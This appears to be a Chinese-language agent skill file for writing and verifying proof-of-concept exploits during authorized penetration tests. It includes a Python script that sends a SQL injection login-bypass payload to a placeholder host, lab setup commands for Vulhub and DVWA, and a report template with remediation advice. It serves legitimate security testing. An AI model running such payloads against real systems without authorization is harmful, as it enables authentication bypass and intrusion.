---
name: poc
description: PoC 编写与验证
version: 1.0.0
tags: [security, poc, vulnerability]
triggers:
  - "编写 PoC"
  - "漏洞验证"
  - "安全验证"
inputs:
  - name: target_asset
    description: 目标资产（URL、IP、应用）
    required: true
  - name: vulnerability_type
    description: 漏洞类型（SQL注入、XSS、RCE 等）
    required: true
outputs:
  - name: poc_script
    description: PoC 脚本
  - name: verification_report
    description: 验证报告
---

# PoC 编写与验证

> **重要**：PoC 仅用于授权测试环境，未经授权的测试属于违法行为。

## 前置条件
- 已获得目标资产的测试授权
- 已明确漏洞类型和测试范围
- 已准备靶场环境（如 DVWA、WebGoat、Vulhub）

## 流程

### 1. 明确目标资产和漏洞类型

```markdown
## 测试目标

- **目标资产**：http://test.example.com
- **漏洞类型**：SQL 注入
- **测试范围**：登录接口
- **授权文件**：auth-letter.pdf
```

### 2. 编写 PoC 脚本

#### PoC 脚本结构

```python
#!/usr/bin/env python3
"""
PoC: SQL Injection in Login API

Target: http://test.example.com/api/login
Vulnerability: SQL Injection in username parameter
Author: xxx
Date: 2026-06-02
"""

import requests
import sys

# 配置
TARGET_URL = "http://test.example.com/api/login"
TIMEOUT = 10

def verify_vulnerability():
    """验证漏洞是否存在"""
    
    # 正常请求
    normal_payload = {
        "username": "testuser",
        "password": "testpass"
    }
    
    # 恶意请求（SQL 注入）
    malicious_payload = {
        "username": "admin' OR '1'='1' --",
        "password": "anything"
    }
    
    try:
        # 发送正常请求
        normal_response = requests.post(
            TARGET_URL, 
            json=normal_payload, 
            timeout=TIMEOUT
        )
        
        # 发送恶意请求
        malicious_response = requests.post(
            TARGET_URL, 
            json=malicious_payload, 
            timeout=TIMEOUT
        )
        
        # 判断漏洞是否存在
        if (normal_response.status_code == 401 and 
            malicious_response.status_code == 200):
            return True
        
        return False
        
    except requests.RequestException as e:
        print(f"[!] Request failed: {e}")
        return False

def main():
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Vulnerability: SQL Injection")
    print()
    
    print("[*] Verifying vulnerability...")
    if verify_vulnerability():
        print("[+] Vulnerability CONFIRMED!")
        print("[+] PoC successful")
        return 0
    else:
        print("[-] Vulnerability NOT confirmed")
        return 1

if __name__ == "__main__":
    sys.exit(main())
```

#### PoC 编写规范

**必须包含**：
- 文件头注释（描述、目标、作者、日期）
- 配置区域（TARGET、TIMEOUT）
- 验证函数（verify_vulnerability）
- 主函数（main）
- 错误处理

**可选包含**：
- 利用函数（exploit_vulnerability）
- 修复建议（remediation）

### 3. 靶场环境验证

#### 使用 Vulhub

```bash
# 启动靶场环境
cd vulhub/sqli/CVE-2019-xxxxx
docker-compose up -d

# 运行 PoC
python3 poc.py

# 清理环境
docker-compose down
```

#### 使用 DVWA

```bash
# 启动 DVWA
docker run -d -p 80:80 vulnerables/web-dvwa

# 访问 http://localhost:80
# 登录（admin/password）
# 设置安全级别为 Low
# 运行 PoC
```

### 4. 输出 PoC 脚本 + 验证报告

```markdown
## PoC 验证报告

### 测试概要
- 目标：http://test.example.com/api/login
- 漏洞：SQL 注入
- 时间：2026-06-02
- 测试人：xxx

### PoC 脚本
- 文件：poc-sqli-login.py
- 语言：Python 3
- 依赖：requests

### 验证结果

#### 靶场环境
- 环境：Vulhub CVE-2019-xxxxx
- 结果：✓ 漏洞存在
- 截图：screenshots/vulhub.png

#### 目标环境
- 环境：test.example.com
- 结果：✓ 漏洞存在
- 截图：screenshots/target.png

### 漏洞详情
- **类型**：SQL 注入
- **位置**：登录接口 username 参数
- **影响**：可绕过认证，获取管理员权限
- **CVSS**：9.8 (Critical)

### 修复建议
1. 使用参数化查询
2. 输入验证和过滤
3. 最小权限原则
4. WAF 规则

### 附件
- poc-sqli-login.py
- screenshots/
```

## 完成标准
- [ ] 目标资产和漏洞类型已明确
- [ ] PoC 脚本已编写
- [ ] 靶场环境验证通过
- [ ] 目标环境验证通过（如授权）
- [ ] 验证报告已输出

## 参考
- `security/research.md` — 安全调研
- `security/tool-integrate.md` — 工具集成
- [Vulhub](https://github.com/vulhub/vulhub)
- [DVWA](https://github.com/digininja/DVWA)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
